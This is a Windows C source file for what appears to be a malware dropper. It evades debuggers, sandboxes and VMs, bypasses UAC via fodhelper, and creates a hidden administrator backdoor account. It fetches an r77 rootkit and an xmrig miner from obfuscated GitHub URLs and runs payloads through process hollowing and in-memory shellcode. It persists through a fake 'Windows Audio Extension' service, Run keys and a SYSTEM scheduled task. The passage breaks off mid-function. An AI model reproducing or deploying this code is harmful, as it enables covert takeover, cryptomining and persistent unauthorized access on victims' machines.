#include <windows.h>
#include <lm.h>
#include <shlobj.h>
#include <urlmon.h>
#include <shlwapi.h>
#include <sddl.h>
#include <wininet.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "dbghelp.lib")

// Configuration
#define MAX_ATTEMPTS 3
#define PAYLOAD_DELAY 30000
#define EVASION_SEED 0xDEADBEEF

// Global state
static const char* g_backdoorUsername = "TBuG";
static BOOL g_accountCreated = FALSE;
static char g_mallDir[MAX_PATH] = {0};
static char g_svchostPath[MAX_PATH] = {0};
static BOOL g_mallExtracted = FALSE;

// Obfuscated strings
typedef struct {
    DWORD key;
    BYTE* data;
    size_t len;
} OBF_STR;

// Anti-analysis prototypes
void AntiSandbox();
void AntiDebug();
BOOL IsDebugged();
void RandomSleep(DWORD base, DWORD variance);
void EvadeMemoryScanners();

// Privilege and execution
BOOL ElevatePrivileges();
BOOL IsAdmin();
void CreateBackdoorAccount();
void RemoveBackdoorAccount();
void DisablePowerShellRestrictions();

// Payload handling
void DownloadAndExecutePayloads();
BOOL DownloadAndExtractMallZip();
BOOL ExecuteR77FromMemory(BOOL isExe);
BOOL ExecuteR77FromDisk(BOOL isExe);
BYTE* DownloadToMemory(const char* url, DWORD* pSize);
BOOL ExecutePEFromMemory(BYTE* peData, DWORD peSize);
BOOL ExecuteShellcode(BYTE* shellcode, DWORD size);
void DownloadFile(const char* url, const char* savePath);
void RunHiddenCommand(LPCSTR command);
void AddToStartup(const char* appName, const char* appPath);
void EstablishPersistence();
void CleanupTemporaryResources();

// Utilities
OBF_STR ObfuscateString(const char* input, DWORD key);
char* Deobfuscate(const OBF_STR* obf);
void SecureFree(void* ptr, size_t size);
void CleanTrace();
BOOL PrepareMallDirectory();

// Random generator
static DWORD rand_state = 0;
void my_srand(DWORD seed) { rand_state = seed; }
int my_rand() {
    rand_state = (rand_state * 214013 + 2531011);
    return (rand_state >> 16) & 0x7FFF;
}

// Advanced anti-debugging
void AntiDebug() {
    if (IsDebuggerPresent()) ExitProcess(0);
    
    // Check process list for analysis tools
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            const char* tools[] = {"ollydbg", "ida", "wireshark", "procmon", "vboxservice"};
            do {
                for (int i = 0; i < sizeof(tools)/sizeof(tools[0]); i++) {
                    if (StrStrIA(pe32.szExeFile, tools[i])) {
                        ExitProcess(0);
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    // Check for hardware breakpoints
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
            ExitProcess(0);
        }
    }
}

// Enhanced sandbox evasion
void AntiSandbox() {
    // Time manipulation check
    DWORD start = GetTickCount();
    Sleep(1000);
    if ((GetTickCount() - start) < 900) ExitProcess(0);
    
    // Memory check
    MEMORYSTATUSEX mem = {sizeof(mem)};
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) ExitProcess(0);
    
    // CPU core check
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 4) ExitProcess(0);
    
    // Disk size check
    ULARGE_INTEGER freeBytes;
    GetDiskFreeSpaceExA("C:\\", NULL, &freeBytes, NULL);
    if (freeBytes.QuadPart < (50ULL * 1024 * 1024 * 1024)) ExitProcess(0);
    
    // Enhanced VM detection
    if (GetSystemMetrics(SM_REMOTESESSION)) ExitProcess(0);  // RDP session
    
    // Check for common VM drivers
    const char* drivers[] = {
        "vboxmrxnp.dll", "vboxogl.dll", "vmtools.dll", 
        "vm3dgl.dll", "vmdum.dll", "vm3dver.dll"
    };
    
    for (int i = 0; i < sizeof(drivers)/sizeof(drivers[0]); i++) {
        if (GetModuleHandleA(drivers[i])) {
            ExitProcess(0);
        }
    }
    
    // Check for sandbox processes
    const char* processes[] = {
        "vboxservice.exe", "vboxtray.exe", "vmacthlp.exe",
        "vmtoolsd.exe", "vmwaretray.exe", "xenservice.exe"
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (int j = 0; j < sizeof(processes)/sizeof(processes[0]); j++) {
                    if (StrStrIA(pe32.szExeFile, processes[j])) {
                        CloseHandle(hSnapshot);
                        ExitProcess(0);
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
}

// Privilege escalation with UAC bypass
BOOL ElevatePrivileges() {
    char selfPath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) return FALSE;

    // Use fodhelper UAC bypass
    HKEY hKey;
    if (RegCreateKeyA(HKEY_CURRENT_USER, 
        "Software\\Classes\\ms-settings\\shell\\open\\command", &hKey) != ERROR_SUCCESS) 
        return FALSE;
    
    DWORD pathLen = lstrlenA(selfPath) + 1;
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)selfPath, pathLen);
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(hKey);
    
    // Trigger activation
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpFile = "cmd.exe";
    sei.lpParameters = "/c start fodhelper.exe";
    sei.nShow = SW_HIDE;
    
    if (!ShellExecuteExA(&sei)) return FALSE;
    
    // Cleanup
    Sleep(5000);
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    return TRUE;
}

// Admin check
BOOL IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    
    if(AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

// Backdoor account with random password
void CreateBackdoorAccount() {
    USER_INFO_1 ui = {0};
    NET_API_STATUS status;
    WCHAR usernameW[MAX_PATH] = {0};
    
    // Convert username
    if (MultiByteToWideChar(CP_UTF8, 0, g_backdoorUsername, -1, usernameW, MAX_PATH) == 0) {
        return;
    }
    
    // Generate random password
    WCHAR passwordW[32] = {0};
    HCRYPTPROV hProv;
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        BYTE random[16];
        CryptGenRandom(hProv, sizeof(random), random);
        for (int i = 0; i < 15; i++) {
            passwordW[i] = L'a' + (random[i] % 26);
        }
        passwordW[15] = L'\0';
        CryptReleaseContext(hProv, 0);
    } else {
        const char* password = "P@ssw0rd123!";
        MultiByteToWideChar(CP_UTF8, 0, password, -1, passwordW, MAX_PATH);
    }
    
    // Check if account exists
    LPBYTE userInfo = NULL;
    if (NetUserGetInfo(NULL, usernameW, 1, &userInfo) == NERR_Success) {
        NetApiBufferFree(userInfo);
        g_accountCreated = TRUE;
        return;
    }
    
    ui.usri1_name = usernameW;
    ui.usri1_password = passwordW;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    
    status = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (status != NERR_Success) return;
    
    g_accountCreated = TRUE;
    
    // Add to administrators group
    LOCALGROUP_MEMBERS_INFO_3 account;
    account.lgrmi3_domainandname = usernameW;
    status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    
    if (status != NERR_Success) {
        // PowerShell fallback
        char psCmd[256];
        wsprintfA(psCmd, "powershell -Command \"Add-LocalGroupMember -Group 'Administrators' -Member '%S' -ErrorAction SilentlyContinue\"", 
                 usernameW);
        RunHiddenCommand(psCmd);
    }
    
    // Hide account
    HKEY hKey;
    const char* regPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, 
                       KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD hideValue = 0;
        RegSetValueExA(hKey, g_backdoorUsername, 0, REG_DWORD, 
                      (const BYTE*)&hideValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    
    // Remove from Users group
    LOCALGROUP_MEMBERS_INFO_3 removeInfo = {0};
    removeInfo.lgrmi3_domainandname = usernameW;
    NetLocalGroupDelMembers(NULL, L"Users", 3, (LPBYTE)&removeInfo, 1);
}

// Account removal
void RemoveBackdoorAccount() {
    if (!g_accountCreated) return;

    WCHAR usernameW[MAX_PATH];
    if (MultiByteToWideChar(CP_UTF8, 0, g_backdoorUsername, -1, usernameW, MAX_PATH) == 0) {
        return;
    }
    
    // Delete account
    NET_API_STATUS status = NetUserDel(NULL, usernameW);
    if (status != NERR_Success) {
        // PowerShell fallback
        char psCmd[256];
        wsprintfA(psCmd, "powershell -Command \"Remove-LocalUser -Name '%S' -ErrorAction SilentlyContinue\"", 
                 usernameW);
        RunHiddenCommand(psCmd);
    }
    
    // Clean registry entry
    HKEY hKey;
    const char* regPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, g_backdoorUsername);
        RegCloseKey(hKey);
    }
}

// Disable PowerShell restrictions
void DisablePowerShellRestrictions() {
    HKEY hKey;
    OBF_STR subkey = ObfuscateString("SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell", EVASION_SEED);
    OBF_STR value = ObfuscateString("ExecutionPolicy", EVASION_SEED);
    OBF_STR data = ObfuscateString("Unrestricted", EVASION_SEED);
    
    char* realSubkey = Deobfuscate(&subkey);
    char* realValue = Deobfuscate(&value);
    char* realData = Deobfuscate(&data);
    
    if (!realSubkey || !realValue || !realData) return;
    
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, realSubkey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD dataLen = strlen(realData) + 1;
        RegSetValueExA(hKey, realValue, 0, REG_SZ, (const BYTE*)realData, dataLen);
        RegCloseKey(hKey);
    }
    
    SecureFree(realSubkey, subkey.len);
    SecureFree(realValue, value.len);
    SecureFree(realData, data.len);
    SecureFree(subkey.data, subkey.len);
    SecureFree(value.data, value.len);
    SecureFree(data.data, data.len);
}

// Function to execute PE from memory using process hollowing
BOOL ExecutePEFromMemory(BYTE* peData, DWORD peSize) {
    // Validate PE header
    if (peSize < sizeof(IMAGE_DOS_HEADER)) return FALSE;
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)peData;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    // Critical e_lfanew validation
    if (dosHeader->e_lfanew < sizeof(IMAGE_DOS_HEADER) || 
        dosHeader->e_lfanew > peSize - sizeof(IMAGE_NT_HEADERS)) {
        return FALSE;
    }

    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(peData + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    // Create suspended process
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char dummyCmd[] = "svchost.exe";

    if (!CreateProcessA(NULL, dummyCmd, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }

    // Allocate memory in target process
    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, NULL, ntHeaders->OptionalHeader.SizeOfImage,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Write PE headers
    if (!WriteProcessMemory(pi.hProcess, remoteBase, peData,
                           ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Write PE sections
    IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        // Validate section boundaries
        if (sectionHeader[i].PointerToRawData + sectionHeader[i].SizeOfRawData > peSize ||
            sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize > ntHeaders->OptionalHeader.SizeOfImage) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }
        
        LPVOID sectionDest = (BYTE*)remoteBase + sectionHeader[i].VirtualAddress;
        LPVOID sectionSrc = peData + sectionHeader[i].PointerToRawData;
        
        if (!WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc,
                               sectionHeader[i].SizeOfRawData, NULL)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }
    }

    // Set base address in PEB
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

#ifdef _WIN64
    DWORD_PTR pebBase = ctx.Rdx + 0x10;
#else
    DWORD_PTR pebBase = ctx.Ebx + 0x8;
#endif

    if (!WriteProcessMemory(pi.hProcess, (LPVOID)pebBase, &remoteBase, sizeof(remoteBase), NULL)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Set entry point
    ctx.ContextFlags = CONTEXT_CONTROL;
#ifdef _WIN64
    ctx.Rcx = (DWORD_PTR)remoteBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
    ctx.Eax = (DWORD_PTR)remoteBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif

    if (!SetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
    
    // Resume and execute
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

// Function to execute shellcode from memory
BOOL ExecuteShellcode(BYTE* shellcode, DWORD size) {
    if (size < 2) return FALSE;
    
    // Allocate executable memory
    LPVOID execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) return FALSE;
    
    memcpy(execMem, shellcode, size);
    
    // Create thread to execute shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(execMem, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Wait briefly to ensure execution starts
    WaitForSingleObject(hThread, 5000);
    
    // Anti-forensics: Clean memory after execution
    SecureZeroMemory(execMem, size);
    VirtualFree(execMem, 0, MEM_RELEASE);
    
    CloseHandle(hThread);
    return TRUE;
}

// Prepare mall directory
BOOL PrepareMallDirectory() {
    if (g_mallDir[0] == '\0') {
        char appDataPath[MAX_PATH];
        if (!GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH)) {
            return FALSE;
        }
        lstrcpyA(g_mallDir, appDataPath);
        PathAppendA(g_mallDir, "Microsoft\\Windows\\Templates\\$77-mall");
    }
    
    if (GetFileAttributesA(g_mallDir) == INVALID_FILE_ATTRIBUTES) {
        if (!CreateDirectoryA(g_mallDir, NULL)) return FALSE;
        SetFileAttributesA(g_mallDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    return TRUE;
}

// Download and extract mall.zip
BOOL DownloadAndExtractMallZip() {
    if (!PrepareMallDirectory()) return FALSE;
    
    // Build URL
    OBF_STR domain = {0}, path = {0};
    char *realDomain = NULL, *realPath = NULL;
    BOOL result = FALSE;
    
    domain = ObfuscateString("github.com", EVASION_SEED);
    path = ObfuscateString("/Drakovthe6th/TBuG/raw/master/mall.zip", EVASION_SEED);
    realDomain = Deobfuscate(&domain);
    realPath = Deobfuscate(&path);
    
    if (!realDomain || !realPath) goto cleanup;
    
    char mallUrl[256];
    if (lstrlenA(realDomain) + lstrlenA(realPath) + 8 > sizeof(mallUrl)) {
        goto cleanup;
    }
    lstrcpyA(mallUrl, "https://");
    lstrcatA(mallUrl, realDomain);
    lstrcatA(mallUrl, realPath);
    
    char zipPath[MAX_PATH];
    lstrcpyA(zipPath, g_mallDir);
    PathRemoveFileSpecA(zipPath);
    PathAppendA(zipPath, "mall.zip");
    
    // Download
    DownloadFile(mallUrl, zipPath);
    
    // Verify download
    HANDLE hFile = CreateFileA(zipPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) goto cleanup;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    CloseHandle(hFile);
    
    if (fileSize < 1024) {
        DeleteFileA(zipPath);
        goto cleanup;
    }
    
    // Extract
    char psCmd[512];
    _snprintf(psCmd, sizeof(psCmd),
        "powershell -Command \"Expand-Archive -Path '%s' -DestinationPath '%s' -Force\"",
        zipPath, 
        g_mallDir
    );
    RunHiddenCommand(psCmd);
    
    // Verify extraction
    char testFile[MAX_PATH];
    lstrcpyA(testFile, g_mallDir);
    PathAppendA(testFile, "Install.exe");
    
    g_mallExtracted = (GetFileAttributesA(testFile) != INVALID_FILE_ATTRIBUTES);
    result = g_mallExtracted;
    DeleteFileA(zipPath);

cleanup:
    // Comprehensive cleanup
    if (realDomain) SecureFree(realDomain, domain.len);
    if (realPath) SecureFree(realPath, path.len);
    if (domain.data) SecureFree(domain.data, domain.len);
    if (path.data) SecureFree(path.data, path.len);
    
    return result;
}

// Execute R77 from memory (Step 1 and 3)
BOOL ExecuteR77FromMemory(BOOL isExe) {
    OBF_STR url;
    if (isExe) {
        url = ObfuscateString("https://github.com/Drakovthe6th/TBuG/raw/master/Install.exe", EVASION_SEED);
    } else {
        url = ObfuscateString("https://github.com/Drakovthe6th/TBuG/raw/master/Install.shellcode", EVASION_SEED);
    }
    
    char* realUrl = Deobfuscate(&url);
    if (!realUrl) {
        SecureFree(url.data, url.len);
        return FALSE;
    }
    
    DWORD size = 0;
    BYTE* payload = DownloadToMemory(realUrl, &size);
    BOOL success = FALSE;
    
    if (payload && size > 0) {
        if (isExe) {
            success = ExecutePEFromMemory(payload, size);
        } else {
            success = ExecuteShellcode(payload, size);
        }
    }
    
    if (payload) SecureFree(payload, size);
    SecureFree(realUrl, url.len);
    SecureFree(url.data, url.len);
    
    return success;
}

// Execute R77 from disk (Step 2 and 4)
BOOL ExecuteR77FromDisk(BOOL isExe) {
    if (!g_mallExtracted) return FALSE;
    
    char filePath[MAX_PATH];
    lstrcpyA(filePath, g_mallDir);
    
    if (isExe) {
        PathAppendA(filePath, "Install.exe");
    } else {
        PathAppendA(filePath, "Install.shellcode");
    }
    
    if (GetFileAttributesA(filePath) == INVALID_FILE_ATTRIBUTES) {
        return FALSE;
    }
    
    if (isExe) {
        // Execute EXE normally
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        BOOL success = CreateProcessA(filePath, NULL, NULL, NULL, FALSE, 
                                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (success) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return TRUE;
        }
        return FALSE;
    } else {
        // Execute shellcode from file
        HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, 
                                  NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return FALSE;
        
        DWORD size = GetFileSize(hFile, NULL);
        if (size == INVALID_FILE_SIZE || size < 2) {
            CloseHandle(hFile);
            return FALSE;
        }
        
        BYTE* buffer = (BYTE*)malloc(size);
        if (!buffer) {
            CloseHandle(hFile);
            return FALSE;
        }
        
        DWORD bytesRead;
        BOOL success = ReadFile(hFile, buffer, size, &bytesRead, NULL) && 
                       bytesRead == size;
        CloseHandle(hFile);
        
        if (success) {
            success = ExecuteShellcode(buffer, size);
        }
        
        SecureFree(buffer, size);
        return success;
    }
}

// Multi-stage R77 installation
void InstallR77() {
    BOOL r77Installed = FALSE;
    
    // Step 1: Execute Install.exe from memory
    r77Installed = ExecuteR77FromMemory(TRUE);
    if (r77Installed) return;
    
    // Step 2: Execute Install.exe from mall directory
    if (!g_mallExtracted) {
        DownloadAndExtractMallZip();
    }
    r77Installed = ExecuteR77FromDisk(TRUE);
    if (r77Installed) return;
    
    // Step 3: Execute Install.shellcode from memory
    r77Installed = ExecuteR77FromMemory(FALSE);
    if (r77Installed) return;
    
    // Step 4: Execute Install.shellcode from mall directory
    if (g_mallExtracted) {
        r77Installed = ExecuteR77FromDisk(FALSE);
        if (r77Installed) return;
    }
}

// Payload installation
void DownloadAndExecutePayloads() {
    PrepareMallDirectory();
    
    // Execute R77 through multi-stage installation
    InstallR77();
    
    // Configure port hiding
    HKEY hKey;
    if (RegCreateKeyA(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\$77config\\tcp_remote", &hKey) == ERROR_SUCCESS) {
        DWORD port = 443;
        RegSetValueExA(hKey, "XMR", 0, REG_DWORD, (BYTE*)&port, sizeof(port));
        RegCloseKey(hKey);
    }

    // Execute $77-Egde.exe
    char edgePath[MAX_PATH];
    lstrcpyA(edgePath, g_mallDir);
    PathAppendA(edgePath, "$77-xmrig.exe");
    lstrcpyA(g_svchostPath, edgePath);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // First try to execute from memory
    OBF_STR edgeUrl = ObfuscateString("https://github.com/Drakovthe6th/TBuG/raw/master/$77-Egde.exe", EVASION_SEED);
    char* realUrl = Deobfuscate(&edgeUrl);
    DWORD edgeSize = 0;
    BYTE* edgeData = DownloadToMemory(realUrl, &edgeSize);
    
    BOOL edgeExecuted = FALSE;
    if (edgeData && edgeSize > 0) {
        edgeExecuted = ExecutePEFromMemory(edgeData, edgeSize);
        SecureFree(edgeData, edgeSize);
    }
    
    // Fallback to disk execution
    if (!edgeExecuted && GetFileAttributesA(edgePath) != INVALID_FILE_ATTRIBUTES) {
        CreateProcessA(edgePath, NULL, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    // Execute $77-SystemHelper.exe
    char helperPath[MAX_PATH];
    lstrcpyA(helperPath, g_mallDir);
    PathAppendA(helperPath, "$77-SystemHelper.exe");
    
    // First try to execute from memory
    OBF_STR helperUrl = ObfuscateString("https://github.com/Drakovthe6th/TBuG/raw/master/$77-SystemHelper.exe", EVASION_SEED);
    char* helperRealUrl = Deobfuscate(&helperUrl);
    DWORD helperSize = 0;
    BYTE* helperData = DownloadToMemory(helperRealUrl, &helperSize);
    
    BOOL helperExecuted = FALSE;
    if (helperData && helperSize > 0) {
        helperExecuted = ExecutePEFromMemory(helperData, helperSize);
        SecureFree(helperData, helperSize);
    }
    
    // Fallback to disk execution
    if (!helperExecuted && GetFileAttributesA(helperPath) != INVALID_FILE_ATTRIBUTES) {
        CreateProcessA(helperPath, NULL, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    // Cleanup
    SecureFree(realUrl, edgeUrl.len);
    SecureFree(edgeUrl.data, edgeUrl.len);
    SecureFree(helperRealUrl, helperUrl.len);
    SecureFree(helperUrl.data, helperUrl.len);
}

// Startup persistence
void AddToStartup(const char* appName, const char* appPath) {
    // Registry persistence
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD pathLen = lstrlenA(appPath) + 1;
        RegSetValueExA(hKey, appName, 0, REG_SZ, (const BYTE*)appPath, pathLen);
        RegCloseKey(hKey);
    }
    
    // Scheduled task persistence
    char cmd[512];
    lstrcpyA(cmd, "schtasks /create /tn \"");
    lstrcatA(cmd, appName);
    lstrcatA(cmd, "\" /tr \"\"");
    lstrcatA(cmd, appPath);
    lstrcatA(cmd, "\"\" /sc onlogon /ru SYSTEM /f");
    RunHiddenCommand(cmd);
}

// Persistence setup
void EstablishPersistence() {
    if (GetFileAttributesA(g_svchostPath) == INVALID_FILE_ATTRIBUTES) {
        return;
    }
    
    // Service-based persistence (primary)
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (scm) {
        char displayName[] = "Windows Audio Extension";
        
        // Secure buffer sizing
        char svcPath[MAX_PATH * 2];
        int len = snprintf(svcPath, sizeof(svcPath), 
                          "\"%s\" --service", g_svchostPath);
        if (len < 0 || (size_t)len >= sizeof(svcPath)) {
            CloseServiceHandle(scm);
            return;
        }
        
        SC_HANDLE svc = CreateServiceA(
            scm, "AudiosrvExt", displayName,
            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
            svcPath, NULL, NULL, NULL, NULL, NULL
        );
        
        if (svc) {
            SERVICE_DESCRIPTION sd = {"Manages audio enhancements"};
            ChangeServiceConfig2A(svc, SERVICE_CONFIG_DESCRIPTION, &sd);
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
    
    // Fallback methods
    OBF_STR startupName = ObfuscateString("WindowsHostService", EVASION_SEED);
    char* realName = Deobfuscate(&startupName);
    if (realName) {
        AddToStartup(realName, g_svchostPath);
        SecureFree(realName, startupName.len);
    }
    SecureFree(startupName.data, startupName.len);
}

// Temporary resource cleanup
void CleanupTemporaryResources() {
    RemoveBackdoorAccount();
    
    char zipPath[MAX_PATH];
    lstrcpyA(zipPath, g_mallDir);
    PathRemoveFileSpecA(zipPath);
    PathAppendA(zipPath, "mall.zip");
    DeleteFileA(zipPath);
    
    char batchPath[MAX_PATH];
    GetTempPathA(MAX_PATH, batchPath);
    PathAppendA(batchPath, "sysclean.bat");
    DeleteFileA(batchPath);
}

// Random sleep to evade timing analysis
void RandomSleep(DWORD base, DWORD variance) {
    DWORD sleepTime = base + (my_rand() % variance);
    Sleep(sleepTime);
}

// Implementations of missing functions
BYTE* DownloadToMemory(const char* url, DWORD* pSize) {
    HINTERNET hInternet = InternetOpenA("TBuG/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return NULL;

    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, 
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return NULL;
    }

    BYTE* buffer = NULL;
    DWORD totalRead = 0;
    DWORD bufferSize = 0;
    BYTE chunk[4096];
    DWORD bytesRead;

    while (InternetReadFile(hUrl, chunk, sizeof(chunk), &bytesRead)) {
        if (bytesRead == 0) break;

        BYTE* newBuffer = (BYTE*)realloc(buffer, bufferSize + bytesRead);
        if (!newBuffer) {
            free(buffer);
            buffer = NULL;
            break;
        }
        buffer = newBuffer;
        memcpy(buffer + bufferSize, chunk, bytesRead);
        bufferSize += bytesRead;
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (buffer && bufferSize > 0) {
        *pSize = bufferSize;
        return buffer;
    }

    if (buffer) free(buffer);
    *pSize = 0;
    return NULL;
}

void DownloadFile(const char* url, const char* savePath) {
    HRESULT hr = URLDownloadToFileA(NULL, url, savePath, 0, NULL);
    if (hr != S_OK) {
        // Failure is silent
    }
}

void RunHiddenCommand(LPCSTR command) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmdCopy[1024];
    lstrcpynA(cmdCopy, command, sizeof(cmdCopy));

    if (CreateProcessA(NULL, cmdCopy, NULL, NULL, FALSE, 
